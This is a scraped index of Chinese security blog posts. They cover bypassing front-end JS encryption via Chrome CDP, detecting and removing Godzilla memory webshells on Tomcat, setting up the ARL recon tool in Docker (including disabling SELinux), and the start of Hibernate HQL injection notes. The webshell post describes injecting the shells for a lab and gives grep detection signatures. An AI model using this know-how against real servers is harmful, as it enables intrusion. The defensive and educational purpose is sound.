","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:7:1","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"整体流程 工作流： 启动 Chrome 时开启调试端口（--remote-debugging-port=9222）。 通过 CDP 客户端（如 Puppeteer）发送命令执行 JS 函数或捕获加密过程 典型工具：Chrome DevTools、基于 CDP 的自定义脚本（如 Python 调用） 练手地址：https://github.com/0ctDay/encrypt-decrypt-vuls 原创项目：https://github.com/Nstkm001/CDP_test 用于快速生成加解密接口，利用cdp协议对断点帧进行调用。 1.启用node cdp.js对cdp监听。 2.使用python去启动调试的web进行连接cdp。 3.打开f12定好断点,运行到断点。 4.调用加解密表达式。 5.规划并填充至中间代理脚本。 案例：Cdp协议深度应用Web渗透加解密 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:7:2","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"参考文献 网页接口加密暴破——d4mlts burp自定义解密数据插件 热加载、热加载场景案例：爆破aes cbc加密、Yakit技能联动：codec \u0026 WebFuzzer —— YAK yakit热加载常用API学习 JsRpc联动burp实现自动加解密（详细版）：用案例讲解JsRpc，配合Burp ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:8:0","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"文件属性 创建时间：2025-06-04 22:19 修订记录： 2025-06-04 ，此次修订内容| 新建 2025-07-27 ，完成1.0版本 | 上传 备注： 拖延症拖太久了，这文章写的跟原本预期不太一样，很多东西没填充进去，感觉有点水了。 有机会再把里面的一些方法具体拿出来说说，着急写完，不管了（狗头 🐶 ）。 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:9:0","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["应急响应"],"content":"本文以哥斯拉为例主要讲解对Filter类和Servlet类的排查处置","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"简述 大型派对活动在即，可能会遇到内存马场景，本篇写给对Java不熟悉的朋友，不会涉及很多技术细节。 内存马历史： 内存马历史也很多年了，网上文章也很多，总有能帮助到你的。 其实内存马由来已久，早在17年n1nty师傅的《Tomcat源码调试笔记-看不见的shell》中已初见端倪，但一直不温不火。 后经过rebeyong师傅使用agent技术加持后，拓展了内存马的使用场景，然终停留在奇技淫巧上。 在各类hw洗礼之后，文件shell明显气数已尽。内存马以救命稻草的身份重回大众视野。 特别是今年（2020）在shiro的回显研究之后，引发了无数安全研究员对内存webshell的研究，其中涌现出了LandGrey师傅构造的Spring controller内存马。 内存马简述： 常规的Webshell基于文件类形式存在，而内存马是一种无文件攻击手段，因此也被称为不落地马或者无文件马。 内存马在语言类型上有PHP内存马，Python内存马，而本文主要侧重于“市场占有率”最高的java内存马的检测与查杀，java内存马主要分为三大类型： servlet-api类：filter型、servlet型、listener型 spring类：拦截器、controller型 Java Instrumentation类：agent型 原理简述： Java Servlet 的实现原理，如下图： 客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，而内存马利用在请求过程中在内存中修改或动态注册新的组件，达到注入Webshell的目的。 ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:1:0","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"环境准备 本文侧重在内存马查杀，我们可以准备一个简单环境。 Tomcat，我用的是 Tomcat 9.0.85 Webshell管理工具：哥斯拉、冰蝎 内存马排查工具：Arthas、java-memshell-scanner 首先启动Tomcat服务器 ┌──(xavier💀X-AQ550M)-[~/CodeSpace/Tomcat/apache-tomcat-9.0.85-2/bin] └─$ chmod +x catalina.sh ┌──(xavier💀X-AQ550M)-[~/CodeSpace/Tomcat/apache-tomcat-9.0.85-2/bin] └─$ ./catalina.sh start Using CATALINA_BASE: /Users/xavier/CodeSpace/Tomcat/apache-tomcat-9.0.85-2 Using CATALINA_HOME: /Users/xavier/CodeSpace/Tomcat/apache-tomcat-9.0.85-2 Using CATALINA_TMPDIR: /Users/xavier/CodeSpace/Tomcat/apache-tomcat-9.0.85-2/temp Using JRE_HOME: /Library/Java/JavaVirtualMachines/jdk-18.0.2.jdk/Contents/Home Using CLASSPATH: /Users/xavier/CodeSpace/Tomcat/apache-tomcat-9.0.85-2/bin/bootstrap.jar:/Users/xavier/CodeSpace/Tomcat/apache-tomcat-9.0.85-2/bin/tomcat-juli.jar Using CATALINA_OPTS: Tomcat started. ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:2:0","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"查杀思路 我们需要了解的是如何去快速确认内存马是否存在，如何确定其位置，如何进行清除。 消息来源：为什么怀疑有内存马，通常是以下集中情况： 流量设备的内存马告警，有具体请求的uri可以辅助后面排查 主机防护的可疑命令告警， 服务器突然进行横向攻击扫描 其他人工上报：比如服务器性能异常，某些接口访问异常等。 排查思路： 弄清楚当前环境的服务架构：中间件、组件、框架等 日志排查：排查服务器web日志，查看是否有可疑的web访问日志，比如有大量请求URL路径相同但参数不同的，或者页面不存在但是返回200的请求，或者同一个URL请求有大量访问记录为500等等。 中间件排查：如果web日志未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法，根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。 查看是否有类似哥斯拉、冰蝎特征的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。 通过查找返回200的url路径对应的web目录下是否真实存在文件，如不存在大概率为内存马。 上述是大致思路，接下去要进行具体排查分析，就需要选择合适的工具进行分析。 ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:3:0","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"查杀检测工具 本文主要讲解使用 java-memshell-scanner、Arthas进行内存马排查，其他的可自行试验。 首先我们在不注入内存马的情况下，先使用工具查看一下当前状态 ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:4:0","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"java-memshell-scanner java-memshell-scanner，c0ny1师傅编写的jsp内存马检测脚本，通过jsp脚本扫描并查杀各类中间件内存马，比 Java agent 要温和一些。 该脚本的使用非常简单，将 java-memshell-scanner 脚本放在能访问的web路径下，然后直接访问就可以获得结果。支持Filter类和Servlet类内存马查杀。 将java-memshell-scanner下的tomcat-memshell-scanner.jsp复制到网站目录下， ┌──(xavier💀X-AQ550M)-[~/…/Tomcat/apache-tomcat-9.0.85-2/webapps/ROOT] └─$ ll total 384 -rw-r--r--@ 1 xavier staff 27530 1 5 2024 asf-logo-wide.svg -rw-r--r--@ 1 xavier staff 713 1 5 2024 bg-button.png -rw-r--r--@ 1 xavier staff 1918 1 5 2024 bg-middle.png -rw-r--r--@ 1 xavier staff 1401 1 5 2024 bg-nav.png -rw-r--r--@ 1 xavier staff 3103 1 5 2024 bg-upper.png -rw-r--r--@ 1 xavier staff 21630 1 5 2024 favicon.ico -rw-r--r--@ 1 xavier staff 12453 1 5 2024 index.jsp -rw-r--r--@ 1 xavier staff 7075 1 5 2024 RELEASE-NOTES.txt -rw-r--r--@ 1 xavier staff 1092 6 17 23:20 shell01.jsp -rw-rw-r--@ 1 xavier staff 16876 10 13 2020 tomcat-memshell-scanner.jsp -rw-r--r--@ 1 xavier staff 5895 1 5 2024 tomcat.css -rw-r--r--@ 1 xavier staff 68761 1 5 2024 tomcat.svg drwxr-xr-x@ 3 xavier staff 96 1 5 2024 WEB-INF 通过Web端进行访问，可以看得只有默认的Tomcat filter和servlet。 ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:4:1","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"Arthas Arthas，Arthas是一款开源的Java诊断工具，基本使用场景是定位复现一些生产环境比较难以定位问题。可以在线排查问题，以及动态追踪Java代码，实时监控JVM状态等等。 启动 java -jar .\\arthas-boot.jar #java应用进程PID 查看当前的Servlet、Filter、Listener 常用命令 输入Mbean 查看或监控 Mbean 的属性信息，根据内存马的特性，进行筛选出异常组件， 1.查看URL路由（看Servlet内存马） 内存马访问触发特征：URL地址路径在源码中不存在 [arthas@38043]$ mbean | grep \"name=/\" [arthas@38043]$ mbean | grep Servlet [arthas@38043]$ mbean | grep Filter [arthas@38043]$ mbean | grep Listener 查看 Mbean 的信息，查看异常Filter、Servlet、Listener节点 2. sc查看JVM 已加载的类信息 sc #(查看JVM已加载的类信息) sc xxx.* #模糊搜索类 sc *.xxx #支持各种类型 sc *.Filter #搜索符合pattern的Filter sc *.Servlet sc *.Listener #Spring框架内存马 sc * | grep Controller sc * | grep Interceptor 根据类名判断，搜索是否有相关资料，若没有则下载其源码，查看是否有后门，也可直接上传微步在线 查看某类加载的类信息 sc -d \u003cclass_name\u003e # 查看x.AES_BASE64类加载的类信息 sc -d payload x.AES_BASE64 sc -d org.apache.jsp.tomcat_002dmemshell_002dscanner_jsp 反编译指定类 jad --source-only \u003cclass_name\u003e jad --source-only org.apache.jsp.memshell_jsp #反编译指定类 反编译输出的结果能查看到内存马的恶意语句 dump已加载类的字节码 #dump已加载类的bytecode到特定目录 dump org.apache.coyote.type.PlaceholderForType ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:4:2","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"其他工具 aLIEz，内存马查杀工具，采用反射动态加载JDK依赖，不会直接transformer去改bytecode， 现在是直接dump出来依赖研究人员自己分析。杀各个JavaEE容器、中间件的内存马 copagent：自动提取项目 需要自己排查，能排查几乎主流内存马技术 FindShell：内存马查杀工具，尤其针对Agent型，原理是dump出JVM当前的class并进行字节码分析，并加入自动修复的功能 NoAgent-memshell-scanner，NoAgent内存马检测程序，支持检测 agent型内存马、tomcat filter/servlet/listener/valve型内存马、spring interceptor,controller型内存马，支持非agent型内存马的删除功能。 shell-analyzer，一款GUI版本的实时内存马查杀工具，支持本地查杀与远程查杀； 仅测试了Tomcat这一种中间件，不过理论上任何实现了Servlet规范的中间件都可以查杀 ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:4:3","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"案例-哥斯拉内存马 ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:5:0","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"注入内存马 哥斯拉生成普通的Webshell，将shell01.jsp放到Tomcat Web目录下 通过哥斯拉连接Webshell，连接正常， 右键进入，在shell页面选择内存马MemoryShell 或 FilterShell，选择相应的类型进行执行。 哥斯拉内存马是servlet型和filter型，这两种相对比较好排查。 注入Servlet型 注入前可以先选择 ServletManage 点击 getAllServlet，查看下当前的状态 通过MemoryShell，设置好选项后，点击 run 进行注入 注入后再次点击 ServletManage，点击 getAllServlet，查看下当前的状态，可以看到新增了一条。 注入Filter型 注入前可以先点击 getAllFilter，查看下当前的状态 通过点击 addFilterShell 进行注入 注入后再次点击 getAllFilter，查看下当前的状态，可以看到新增了一条。 ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:5:1","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"java-memshell-scanner排查 通过访问 /tomcat-memshell-scanner.jsp 即可进行排查，可以看到新增的两条都被找到了。 http://localhost:8080/tomcat-memshell-scanner.jsp 通过dump可以下载相应的class类进行分析，点击Kill即可删除相应内存马。 ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:5:2","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"Arthas排查 Arthas 只能排查是否存在，提取内存马Class并反编译，无法直接删除。 查看 Mbean 的信息，查看异常Filter/Servlet节点 mbean | grep \"Servlet\" mbean | grep Filter 在真实常见中，就需要我们对这些相应的servlet、filter名称有一些了解，从而发现其中的异常可疑类。 搜索查看JVM已加载的类信息，模糊匹配Servlet和Filter类 sc *.Servlet sc *.Filter 可以看到新增了很多类，其中有些是我们上传的shell01.jsp导致 的，我们对其中可疑的类进行分析。 反编译指定的类 jad --source-only org.apache.jsp.shell01_jsp 这里可以看到，反编译输出的结果能很清晰的查看到冰蝎马的内容和密码。 dump可疑类进行分析 dump org.apache.coyote.deser.CreatorProperty dump org.apache.coyote.deser.std.ByteBufferDeserializer 通过反编译工具反编译相关类，可以查看到内存马的恶意语句 org.apache.coyote.deser.CreatorProperty对应的Servlet类内存马： org.apache.coyote.deser.std.ByteBufferDeserializer对应的Filter类内存马： 内存Dump [arthas@13465]$ heapdump Dumping heap to /Users/xavier/CodeSpace/Tomcat/apache-tomcat-9.0.85-2/temp/heapdump2025-07-10-16-325369075522353126614.hprof ... Heap dump file created #设置保存路径时建议用绝对路径 [arthas@13465]$ heapdump /Users/xavier/Desktop/Tmp/heapdump-1.hprof Dumping heap to /Users/xavier/Desktop/Tmp/heapdump-1.hprof ... Heap dump file created 根据关键词进行检索 $ strings heapdump-1.hprof | grep \"POST /\" $ strings heapdump-1.hprof| grep \"favicon.ico\" com/taobao/arthas/core/http/favicon.icoPK POST //favicon.ico HTTP/1.1 org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/].[/favicon.ico]! J2EEApplication=none,J2EEServer=none,WebModule=//localhost/,j2eeType=Servlet,name=/favicon.ico! Catalina:J2EEApplication=none,J2EEServer=none,WebModule=//localhost/,j2eeType=Servlet,name=/favicon.ico\" /favicon.ico! /favicon.icoo 来自网络的 冰蝎、哥斯拉内存检测命令 # dump内存，用arthas Dump内存替代 jmap -dump:live,format=b,file=heapdump.hprof pid # 检测Godzilla if grep -q 'getBasicsInfo' heapdump.hprof \u0026\u0026 grep -q 'srcFileName' heapdump.hprof \u0026\u0026 grep -q 'destFileName' heapdump.hprof;then echo 'exist Godzilla';else echo '';fi; # 检测冰蝎 if grep -q 'basicInfo' heapdump.hprof \u0026\u0026 grep -q 'currentPath' heapdump.hprof \u0026\u0026 grep -q 'driveList' heapdump.hprof;then echo 'exist behinder';else echo '';fi; ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:5:3","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"清除内存马 清楚内存马最常见的方式就是对服务进行重启。 针对于Servlet类和Filter类，可以采用工具进行清除，比如上面的 Java-Memshell-Scanner 点击 Kill 进行清除。 ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:5:4","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"参考文献 查杀Java web filter型内存马 c0ny1 2020-08-13 Filter/Servlet型内存马的扫描抓捕与查杀 c0ny1 2020-09-09 冰蝎、哥斯拉 内存马应急排查 ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:6:0","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["应急响应"],"content":"文件属性 创建时间：2025-06-25 10:52 修订记录： 2025-06-25 ，此次修订内容| 新建 备注：xxx ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:7:0","tags":["BlueTeam"],"title":"内存马查杀笔记-入门版","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["Tools"],"content":"ARL灯塔Docker版搭建记录","date":"2025-03-15","objectID":"/posts/arl_setup_record/","tags":["Tools","Docker"],"title":"ARL灯塔Docker版搭建记录","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"之前的云服务器不用了，换了个新的，因此ARL也要重新搭建了，之前搭建的时候没有做笔记，所以这次就记一下。 ARL主仓库已经关闭很久了，用的ARL docker镜像仓库： ARL-docker 中间需要解决几个问题，前三个我就不说了，本文主讲第4步。 docker 的安装 docker 镜像仓库，代理访问 Linux 搭建 代理，我用的clash ARL-docker 搭建 ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:0:0","tags":["Tools","Docker"],"title":"ARL灯塔Docker版搭建记录","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"ARL-docker 搭建 在线下载安装法 下载部署脚本项目：git clone https://github.com/honmashironeko/ARL-docker.git 进入项目文件夹：cd ARL-docker/ 添加运行权限：chmod +x setup-arl.sh 执行部署脚本：bash setup-arl.sh 可能会在运行的时候报错一次，不需要管他，重新运行一遍 bash setup-arl.sh 即可。 启动 ARL 命令：docker-compose up -d 接下来就是记录一些问题、排查过程及解决办法了。 ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:1:0","tags":["Tools","Docker"],"title":"ARL灯塔Docker版搭建记录","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"Q1：服务无法启动 ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:2:0","tags":["Tools","Docker"],"title":"ARL灯塔Docker版搭建记录","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"问题描述 启动 ARL 命令：docker-compose up -d docker ps 发现服务无法启动 有三个容器无法正常启动 arl_web、arl_worker、arl_scheduler， [root@localhost ARL-docker]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 7045ec724fa5 honmashironeko/arl-docker-all \"sh -c 'gen_crt.sh...\" 5 hours ago Restarting (1) 3 minutes ago arl_web 94a3497339c0 honmashironeko/arl-docker-all \"sh -c 'wait-for-i...\" 5 hours ago Restarting (255) 3 minutes ago arl_worker 3bdd87b9a0f3 honmashironeko/arl-docker-all \"sh -c 'wait-for-i...\" 5 hours ago Restarting (255) 3 minutes ago arl_scheduler 58f66a52f583 rabbitmq:3.8.19-management-alpine \"docker-entrypoint...\" 5 hours ago Up 7 minutes 4369/tcp, 5671-5672/tcp, 15671-15672/tcp, 15691-15692/tcp, 25672/tcp arl_rabbitmq 457a964ab6dc mongo:4.0.27 \"docker-entrypoint...\" 5 hours ago Up 7 minutes 27017/tcp arl_mongodb 排查日志： docker logs --tail 20 \u003cCONTAINER ID\u003e 有几个权限报错： Error: Error: 'arl_web.log' isn't writable [PermissionError(13, 'Permission denied')] 还有个/code/app/config.yaml 的权限报错，日志刷没了，不记得具体报错命令了。 看配置文件是本地文件和容器文件的映射 [root@localhost ARL-docker]# cat docker-compose.yml …… services: web: …… volumes: - ./arl_web.log:/code/arl_web.log - ./config-docker.yaml:/code/app/config.yaml 检查文件、目录权限，容器内用户身份，检查 SELinux ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:2:1","tags":["Tools","Docker"],"title":"ARL灯塔Docker版搭建记录","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"解决办法 最后我找到的解决办法是关闭SELinux sudo sestatus # 查看 SELinux 状态 sudo setenforce 0 # 临时关闭 SELinux [root@localhost ARL-docker]# sestatus SELinux status: enabled SELinuxfs mount: /sys/fs/selinux SELinux root directory: /etc/selinux Loaded policy name: targeted Current mode: enforcing Mode from config file: enforcing Policy MLS status: enabled Policy deny_unknown status: allowed Max kernel policy version: 31 [root@localhost ARL-docker]# sudo setenforce 0 [root@localhost ARL-docker]# sestatus SELinux status: enabled SELinuxfs mount: /sys/fs/selinux SELinux root directory: /etc/selinux Loaded policy name: targeted Current mode: permissive Mode from config file: enforcing Policy MLS status: enabled Policy deny_unknown status: allowed Max kernel policy version: 31 清除一下，之后再重启下就解决了。 [root@localhost ARL-docker]# docker-compose down [+] Running 6/6 ✔ Container arl_web Removed 0.3s ✔ Container arl_scheduler Removed 0.3s ✔ Container arl_worker Removed 0.3s ✔ Container arl_rabbitmq Removed 0.0s ✔ Container arl_mongodb Removed 0.0s ✔ Network arl-docker_default Removed 0.2s [root@localhost ARL-docker]# docker-compose up -d [+] Building 0.0s (0/0) [+] Running 6/6 ✔ Network arl-docker_default Created 0.2s ✔ Container arl_mongodb Started 0.9s ✔ Container arl_rabbitmq Started 0.9s ✔ Container arl_worker Started 1.6s ✔ Container arl_scheduler Started 1.6s ✔ Container arl_web Started 1.7s [root@localhost ARL-docker]# ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:2:2","tags":["Tools","Docker"],"title":"ARL灯塔Docker版搭建记录","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"Q2：Web密码错误 ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:3:0","tags":["Tools","Docker"],"title":"ARL灯塔Docker版搭建记录","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"问题描述 前往ARLweb页面：https://IP:5003/，账号：admin，密码：honmashironeko，提示密码错误 进 arl_web 服务容器看了下代码 [root@localhost ARL-docker]# docker exec -it arl_web /bin/bash [root@6a3109921ab8 code]# ls app arl_web.log frontend requirements.txt test [root@6a3109921ab8 app]# cat utils/user.py from flask import request from app import modules from app.config import Config from . import gen_md5, random_choices from .conn import conn_db salt = 'arlsalt!@#' def user_login(username = None, password = None): if not username or not password: return query = {\"username\": username, \"password\": gen_md5(salt + password)} if conn_db('user').find_one(query): item = { \"username\": username, \"token\": gen_md5(random_choices(50)), \"type\": \"login\" } conn_db('user').update_one(query, {\"$set\": {\"token\": item[\"token\"]}}) return item 又看了MongoDB数据库，没发现有账号记录 [root@localhost xavier]# docker exec -ti arl_mongodb mongo -u admin -p admin MongoDB shell version v4.0.27 connecting to: mongodb://127.0.0.1:27017/?gssapiServiceName=mongodb Implicit session: session { \"id\" : UUID(\"dd7329eb-ea82-4041-a454-d43aedb1328b\") } MongoDB server version: 4.0.27 Welcome to the MongoDB shell. ………… \u003e use arl switched to db arl \u003e db.user.find() \u003e db.getCollectionNames(); [ \"asset_domain\", \"asset_ip\", \"asset_site\", \"cert\", \"domain\", \"fileleak\", \"github_monitor_result\", \"github_result\", \"ip\", \"npoc_service\", \"poc\", \"service\", \"site\", \"url\", \"vuln\", \"wih\" ] 没看到有user表 ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:3:1","tags":["Tools","Docker"],"title":"ARL灯塔Docker版搭建记录","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"解决办法 添加账户记录 \u003e db.user.insert({ username: 'admin', password: hex_md5('arlsalt!@#'+'admin123') }) WriteResult({ \"nInserted\" : 1 }) \u003e db.user.find() { \"_id\" : ObjectId(\"67d5ab76da9827cdcf275ce3\"), \"username\" : \"admin\", \"password\" : \"fd9fb75bf102e785e6874af0025a331e\" } \u003e db.getCollectionNames(); [ \"asset_domain\", \"asset_ip\", \"asset_site\", \"cert\", \"domain\", \"fileleak\", \"github_monitor_result\", \"github_result\", \"ip\", \"npoc_service\", \"poc\", \"service\", \"site\", \"url\", \"user\", \"vuln\", \"wih\" ] 最后用了admin、admin123 成功登录。 ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:3:2","tags":["Tools","Docker"],"title":"ARL灯塔Docker版搭建记录","uri":"/posts/arl_setup_record/"},{"categories":["Pentest"],"content":"Hibernate框架HQL注入笔记","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"Hibernate框架 Hibernate是一种ORM框架，用来映射与tables相关的类定义（代码），并包含一些高级特性，包括缓存以及继承，通常在 Java与.NET中使用（可参考 NHibernate），但在Java生态系统中更受欢迎。 内部支持使用原生SQL还有HQL语言进行SQL操作。 通常使用Hibernate框架都是使用HQL语言方式进行查询 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:1:0","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"1、原生SQL语句 String parameter = req.getParameter(\"name\"); Query query = session.createSQLQuery(\"SELECT table_name FROM information_schema.tables where table_schema=?\"); query.setParameter(1, parameter); 在Hibernate 5.2.5.Final 版本中createSQLQuery被弃用了 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:1:1","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"2、HQL语句 HQL语法 # 注意这里查询的都是JAVA类对象 select \"对象.属性名\" from \"对象名\" where \"条件\" group by \"对象.属性名\" having \"分组条件\" order by \"对象.属性名\" HQL需要将数据库中的表映射为相应的类，通过JAVA类对象进行数据查询，示例如下：。 String parameter = req.getParameter(\"name\"); Query query = session.createQuery(\"from User where name = ?1\", User.class); query.setParameter(1, parameter); 其中User就是数据库表的映射实现类对象 HQL查询是由 hibernate 引擎对查询进行解析并解释，然后将其转换为SQL。 参数类型支持3种，上面用的就是叙述参数，第三种基本不用。 Parameter type 参数类型 Examples 例子 Usage from Java Java用法 命名参数 :name, :title, :id :name，:title，:id query.setParameter(\"name\", name) 序数参数 ?1, ?2, ?3 ?1，?2，?3 query.setParameter(1, name) JDBC样式参数 ? query.setParameter(1, name) ?形式的JDBC样式参数类似于序数参数，其中索引是从查询文本中的位置推断出来的。不推荐使用JDBC样式参数。 